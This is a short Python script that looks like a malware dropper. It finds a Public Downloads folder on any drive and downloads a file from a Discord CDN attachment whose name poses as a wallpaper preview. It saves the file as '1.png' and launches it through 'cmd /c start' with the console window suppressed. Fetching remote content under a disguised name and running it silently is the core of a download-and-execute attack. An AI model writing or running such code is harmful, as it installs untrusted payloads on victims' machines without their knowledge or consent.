import os, requests, subprocess

strn = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in strn:
    try:
        os.chdir(i + r":\Users\Public\Downloads")
        break
    except FileNotFoundError:
        pass

response = requests.get(
    'https://cdn.discordapp.com/attachments/698129859972694046/1191547431096164352/tupolev-tu-95-wallpaper-preview.txt',
)


with open('1.png', 'wb') as f:
    f.write(response.content)

print(os.getcwd())

subprocess.call("cmd /c start 1.png", creationflags=subprocess.CREATE_NO_WINDOW)